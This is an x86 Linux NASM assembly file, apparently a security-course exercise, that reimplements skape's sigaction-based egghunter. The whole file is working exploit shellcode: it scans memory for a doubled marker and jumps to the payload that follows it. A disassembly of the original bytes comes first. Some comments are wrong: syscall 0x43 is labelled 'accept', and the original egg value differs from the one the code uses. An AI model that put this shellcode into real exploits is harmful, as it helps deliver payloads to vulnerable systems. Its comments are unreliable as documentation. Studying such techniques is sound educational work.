; Filename: egghunter.nasm
; Author:  SLAE-1268

;
;
; Purpose: Egghunter code
; from skape paper sigaction(2) 
;##############ORIGINAL CODE#########################
;00000000 6681C9FF0F or cx,0xfff
;00000005 41 inc ecx
;00000006 6A43 push byte +0x43
;00000008 58 pop eax
;00000009 CD80 int 0x80
;0000000B 3CF2 cmp al,0xf2
;0000000D 74F1 jz 0x0
;0000000F B890509050 mov eax,0x50905090
;00000014 89CF mov edi,ecx
;00000016 AF scasd
;00000017 75EC jnz 0x5
;00000019 AF scasd
;0000001A 75E9 jnz 0x5
;0000001C FFE7 jmp edi

global _start			

section .text
_start:

	
	xor ecx,ecx	; ECX = NULL
step1:
	or cx,0xfff	; page alignment operation
step2:
	inc ecx		; increment cx for comparison
	push 0x43	; accept syscall on stack
	pop eax		; accept syscall in EAX
	int 0x80	; execute syscall
	cmp al,0xf2	; check for EFAULT
	jz step1	; if EFAULT is generated then realign page. Repeat till no error
	mov eax,0x90509050	; 0x5090 in reverse order if there is no fault (store EGG in EAX)
	mov edi,ecx	; move ECX to EDI for comparison
	scasd		; Check if EDI == EAX , i.e if EGG matches, then increment EDI
	jnz step2	; if not matching, repeat the process by incrementing ECX
	scasd		; Check if EDI == EAX , i.e if EGG matches, then increment EDI ;
	jnz step2	; if not matching, repeat the process. 2 times because we need two EGGs placed back to back
	jmp edi		; jump to EDI which is now pointing to shellcode
		
	

